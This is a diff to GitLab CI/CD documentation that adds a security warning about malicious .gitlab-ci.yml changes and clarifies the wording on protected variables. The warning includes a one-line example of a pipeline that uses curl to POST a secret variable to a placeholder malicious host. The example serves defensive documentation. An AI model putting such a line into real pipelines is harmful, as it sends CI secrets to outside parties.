@@ -141,6 +141,25 @@ The output is:
 
 ![Output custom variable](img/custom_variables_output.png)
 
+Variables can only be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+
+#### Security
+
+Malicious code pushed to your `.gitlab-ci.yml` file could compromise your variables and send them to a third party server regardless of the masked setting. If the pipeline runs on a [protected branch](../../user/project/protected_branches.md) or [protected tag](../../user/project/protected_tags.md), it could also compromise protected variables.
+
+All merge requests that introduce changes to `.gitlab-ci.yml` should be reviewed carefully before:
+
+- [Running a pipeline in the parent project for a merge request submitted from a forked project](../merge_request_pipelines/index.md#run-pipelines-in-the-parent-project-for-merge-requests-from-a-forked-project-starter).
+- Merging the changes.
+
+Here is a simplified example of a malicious `.gitlab-ci.yml`:
+
+```yaml
+build:
+  script:
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+```
+
 ### Custom environment variables of type Variable
 
 > [Introduced](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/46806) in GitLab 11.11.
@@ -215,8 +234,8 @@ You can't mask variables that don't meet these requirements.
 > Introduced in GitLab 9.3.
 
 Variables can be protected. When a variable is
-protected, it is securely passed to pipelines running on
-[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md) only. The other pipelines do not get
+protected, it is only passed to pipelines running on
+[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md). The other pipelines do not get
 the protected variable.
 
 To protect a variable:
@@ -227,8 +246,7 @@ To protect a variable:
 1. Select the **Protect variable** check box.
 1. Click **Update variable**.
 
-The variable is available for all subsequent pipelines. Protected variables can only
-be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+The variable is available for all subsequent pipelines.
 
 ### Custom variables validated by GitLab
 
